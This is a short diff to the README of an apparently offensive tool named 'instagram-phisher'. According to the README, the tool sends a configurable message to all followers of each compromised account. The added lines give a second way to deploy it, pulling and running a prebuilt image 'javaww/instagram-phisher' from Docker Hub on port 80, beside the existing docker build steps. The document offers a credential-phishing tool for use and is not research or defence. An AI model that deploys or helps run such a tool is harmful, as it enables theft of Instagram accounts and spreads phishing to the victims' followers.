@@ -12,6 +12,10 @@ Once a user is compermised, this tool will DM a configurable message to all foll
 docker build -t instagram-phisher ./server
 docker run -p 80:80 instagram-phisher
 ```
+Alternatively, you can pull the latest build from Docker Hub
+```bash
+docker run -p 80:80 javaww/instagram-phisher
+```
 #### Manual installation
 Install `python3` and `python3-pip`
 Use pip to install the dependencies.
